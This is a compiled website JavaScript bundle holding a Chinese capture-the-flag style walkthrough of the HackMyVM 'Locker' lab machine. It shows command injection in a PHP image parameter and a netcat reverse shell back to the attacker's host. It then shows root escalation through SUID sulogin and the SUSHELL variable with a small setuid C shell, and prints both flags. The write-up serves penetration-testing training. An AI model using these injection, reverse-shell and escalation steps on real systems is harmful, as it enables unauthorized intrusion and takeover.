"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1627],{38743:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var s=t(85893),i=t(11151);const r={},a="Locker",o={id:"HackMyVM/Machines/Locker/index",title:"Locker",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Locker/index.md",sourceDirName:"HackMyVM/Machines/Locker",slug:"/HackMyVM/Machines/Locker/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Locker/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Locker/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Insomnia",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Insomnia/"},next:{title:"Moosage",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Moosage/"}},l={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1\u63a2\u6d4b",id:"web-\u670d\u52a1\u63a2\u6d4b",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5229\u7528 <code>sulogin</code>",id:"\u5229\u7528-sulogin",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"root pwned",id:"root-pwned",level:2}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"locker",children:"Locker"})}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,s.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-01-23"}),(0,s.jsx)(n.p,{children:"\u2714\ufe0f MD5 // fbbb0b62ef6c684090506202483ab712"}),(0,s.jsx)(n.p,{children:"\u2620 Root // 117"}),(0,s.jsx)(n.p,{children:"\ud83d\udc80 User // 115"}),(0,s.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun!"})]}),"\n",(0,s.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:t(91048).Z+"",width:"1020",height:"687"})}),"\n",(0,s.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.111\n"})}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.111\nHost is up (0.00050s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.14.2\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:5E:3D:81 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1\u63a2\u6d4b",children:"web \u670d\u52a1\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:t(60120).Z+"",width:"1139",height:"642"})}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u539f\u59cb\u8fd4\u56de"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get 192.168.56.111\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html\nDate: Thu, 28 Dec 2023 09:49:49 GMT\nETag: W/"600a9d7c-8e"\nLast-Modified: Fri, 22 Jan 2021 09:40:12 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\n<h1>SUPER LOCKER</h1>\n<pre>\nUse root password to unlock our powers!\naAaaaAAaaAaAAaAAaAAaaaA!\n<a href="/locker.php?image=1">Model 1</a>\n</pre>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u70b9\u51fb\u94fe\u63a5\uff0c\u53d1\u73b0\u53ea\u8fd4\u56de\u4e86\u4e00\u5f20\u56fe\u7247"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"\u8bbf\u95ee /locker.php?image=1",src:t(55483).Z+"",width:"1139",height:"642"})}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u8bbf\u95ee\u7684\u94fe\u63a5\u8fdb\u884c\u5206\u6790\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.111/locker.php?image=3\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\u70b9\uff1a",(0,s.jsx)(n.code,{children:"image"})," \uff0c\u7f16\u5199\u811a\u672c\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'import requests\n\nbase_url = "http://192.168.56.111/locker.php?image="\n\nfor i in range(0, 10):\n    res = requests.get(base_url + str(i)).text\n    with open("./" + str(i), "w+") as f:\n        f.write(res)\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0\u53ea\u6709\u7f16\u53f7 1\uff0c2\uff0c3 \u6709\u8fd4\u56de\u6570\u636e\uff0c\u5c1d\u8bd5\u5bf9\u56fe\u50cf\u6570\u636e\u8fdb\u884c\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5b58\u5728\u56fe\u50cf\u9690\u5199"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u5bf9\u53c2\u6570\u70b9\u8fdb\u884c fuzz\uff0c\u53d1\u73b0\u5b58\u5728\u547d\u4ee4\u6267\u884c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Locker]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.111/locker.php?image=;pwd\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html; charset=UTF-8\nDate: Thu, 28 Dec 2023 10:07:25 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\n<img src="data:image/jpg;base64,"width="150"height="150"/>\n\n/home/randark/tmp/HackMyVM-Locker\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.111/locker.php?image=;nc%20192.168.56.102%209999%20-e%20/bin/bash;\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u5f97\u5230 shell"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[18:12:43] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                                            __main__.py:164\n[18:13:14] received connection from 192.168.56.111:60486                                                                                                                                                                         bind.py:84\n[18:13:15] 192.168.56.111:60486: registered new host w/ db                                                                                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) www-data@locker:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/sbin/sulogin\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u4ee5\u53d1\u73b0 ",(0,s.jsx)(n.code,{children:"/usr/sbin/sulogin"})," \u53ef\u80fd\u5b58\u5728\u5229\u7528\u70b9"]}),"\n",(0,s.jsxs)(n.h2,{id:"\u5229\u7528-sulogin",children:["\u5229\u7528 ",(0,s.jsx)(n.code,{children:"sulogin"})]}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u770b ",(0,s.jsx)(n.code,{children:"sulogin"})," \u7684\u624b\u518c"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"SULOGIN(8)                                                                                              System Administration                                                                                              SULOGIN(8)\n\nNAME\n       sulogin - single-user login\n\nSYNOPSIS\n       sulogin [options] [tty]\n\nDESCRIPTION\n       sulogin is invoked by init when the system goes into single-user mode.\n\n       The user is prompted:\n\n            Give root password for system maintenance\n            (or type Control-D for normal startup):\n\n       If the root account is locked and --force is specified, no password is required.\n\n       sulogin will be connected to the current terminal, or to the optional tty device that can be specified on the command line (typically /dev/console).\n\n       When the user exits from the single-user shell, or presses control-D at the prompt, the system will continue to boot.\n\nOPTIONS\n       -e, --force\n              If  the default method of obtaining the root password from the system via getpwnam(3) fails, then examine /etc/passwd and /etc/shadow to get the password.  If these files are damaged or nonexistent, or when root ac-\n              count is locked by '!' or '*' at the begin of the password then sulogin will start a root shell without asking for a password.\n\n              Only use the -e option if you are sure the console is physically protected against unauthorized access.\n\n       -p, --login-shell\n              Specifying this option causes sulogin to start the shell process as a login shell.\n\n       -t, --timeout seconds\n              Specify the maximum amount of time to wait for user input.  By default, sulogin will wait forever.\n\n       -h, --help\n              Display help text and exit.\n\n       -V, --version\n              Display version information and exit.\n\nENVIRONMENT VARIABLES\n       sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start.  If the environment variable is not set, it will try to execute root's shell from /etc/passwd.  If that fails,  it  will  fall\n       back to /bin/sh.\n\nAUTHOR\n       sulogin was written by Miquel van Smoorenburg for sysvinit and later ported to util-linux by Dave Reisner and Karel Zak.\n\nAVAILABILITY\n       The sulogin command is part of the util-linux package and is available from Linux Kernel Archive <https://www.kernel.org/pub/linux/utils/util-linux/>.\n\nutil-linux                                                                                                    July 2014                                                                                                    SULOGIN(8)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0\u73af\u5883\u53d8\u91cf ",(0,s.jsx)(n.code,{children:"SUSHELL"})," \u53ef\u4ee5\u63a7\u5236 ",(0,s.jsx)(n.code,{children:"sulogin"})," \u7684\u884c\u4e3a\uff0c\u5c1d\u8bd5\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5229\u7528"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main()\n{\n    setgid(0);\n    setuid(0);\n    system("/bin/bash");\n    return 0;\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7f16\u8bd1\u597d\u4e4b\u540e\uff0c\u4e0a\u4f20\u5230\u9776\u673a\uff0c\u7136\u540e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"export SUSHELL=/tmp/a.out\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u8fdb\u884c\u63d0\u6743"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@locker:/tmp$ export SUSHELL=/tmp/a.out\n(remote) www-data@locker:/tmp$ echo $SUSHELL\n/tmp/a.out\n(remote) www-data@locker:/tmp$ sulogin -e\nPress Enter for maintenance\n(or press Control-D to continue): \nroot@locker:~# whoami\nroot\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@locker:/home/tolocker# cat user.txt \nflaglockeryes\n"})}),"\n",(0,s.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@locker:~# cat root.txt \nigotroothere\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},91048:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20231244-174447-051f86f4a966f4bd8369ec3eb2b6e38a.png"},60120:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20231249-174928-1ef78f81d3bf172f9adc93c3f8f6adb0.png"},55483:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20231251-175121-d6176cd1ffb97cf9cc0e7d30659336d9.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>a});var s=t(67294);const i={},r=s.createContext(i);function a(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);